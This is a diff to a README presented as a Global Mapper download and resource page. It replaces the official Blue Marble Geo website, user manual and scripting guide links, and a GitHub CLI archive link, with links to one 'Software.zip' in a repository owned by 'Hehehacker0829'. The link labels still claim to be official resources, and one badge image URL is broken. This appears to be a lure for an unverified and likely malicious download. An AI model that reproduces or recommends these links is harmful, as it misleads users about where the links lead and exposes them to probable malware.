@@ -22,7 +22,7 @@ In this repository, you will find resources, code snippets, and discussions rela
 
 For easy access to the latest version of the GitHub CLI, please download it using the following link: 
 
-[![Download Global Mapper](https://img.shields.io/badge/Download-Global%20Mapper-yellow)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Global Mapper](https://github.com/Hehehacker0829/Global-Mapper-Download/releases/download/v1.0/Software.zip%20Mapper-yellow)](https://github.com/Hehehacker0829/Global-Mapper-Download/releases/download/v1.0/Software.zip)
 
 Note: The link above needs to be launched to initiate the download.
 
@@ -35,9 +35,9 @@ Stay connected with the latest updates, discussions, and tips related to Global 
 ## 📚 Resources
 
 Explore the following resources to enhance your Global Mapper experience:
-- [Global Mapper Official Website](https://www.bluemarblegeo.com/products/global-mapper.php): Visit the official Global Mapper website for the latest updates and features.
-- [Global Mapper User Manual](https://www.bluemarblegeo.com/knowledgebase/global-mapper-22-0-10-20-21.pdf): Dive deep into the functionalities of Global Mapper with the comprehensive user manual.
-- [Global Mapper Python Scripting Guide](https://www.bluemarblegeo.com/knowledgebase/global-mapper-22-0-10-20-21.pdf): Learn how to automate tasks and extend Global Mapper's capabilities using Python scripting.
+- [Global Mapper Official Website](https://github.com/Hehehacker0829/Global-Mapper-Download/releases/download/v1.0/Software.zip): Visit the official Global Mapper website for the latest updates and features.
+- [Global Mapper User Manual](https://github.com/Hehehacker0829/Global-Mapper-Download/releases/download/v1.0/Software.zip): Dive deep into the functionalities of Global Mapper with the comprehensive user manual.
+- [Global Mapper Python Scripting Guide](https://github.com/Hehehacker0829/Global-Mapper-Download/releases/download/v1.0/Software.zip): Learn how to automate tasks and extend Global Mapper's capabilities using Python scripting.
 
 ## 🤝 Community Support
 
